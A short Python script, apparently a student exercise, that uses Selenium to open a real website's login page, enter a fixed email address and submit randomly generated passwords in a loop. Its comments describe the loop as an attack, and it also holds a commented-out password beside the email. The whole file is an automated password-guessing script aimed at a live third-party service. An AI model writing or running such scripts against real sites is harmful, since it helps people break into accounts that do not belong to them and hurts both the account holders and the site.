import random as rd
#se ocupo selenium
from selenium import webdriver 
letras= 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
numeros= '0123456789'
superscript = '₁ⁱₕ₉ₘ₊⁼⁽ₔ⁰'
emojis = '🌝💓😢🙉'
simbolos= '!@#$%^&><'
arabic = 'ڜ ﭗ ﺹ ﻇ ﻨ ﻩ ﻲ'
intentos=6
l=1  #Largo de contraseña a probar (se va modificando)
tamaño= 1
unidos= f'{letras}{numeros}{arabic}{emojis}{superscript}{simbolos}'
#Automatizacion de inicio de sesion 
driver = webdriver.Chrome("/home/coke/Documentos/Hito2/chromedriver")
#contra= ''.join(rd.sample(unidos,N))
#datos a ingresar      
correo = "cokeffere@mozej.com"  #nombre de usuario que corresponde al correo
#password = "LA37gl85xp2f" #contraseña, se va ir probando y realizando el ataque 
#pagina
link = "https://www.alamy.es/log-in/"
for i in range(intentos):
    driver.get(link)
    tamaño=rd.randint(1,l)
    contra= ''.join(rd.sample(unidos,tamaño))
    driver.find_element_by_name("email").send_keys(correo)
    driver.find_element_by_name("password").send_keys(contra)
    driver.find_element_by_id("btnCreesucuentaahora").click()
    l=l+1
driver.close()



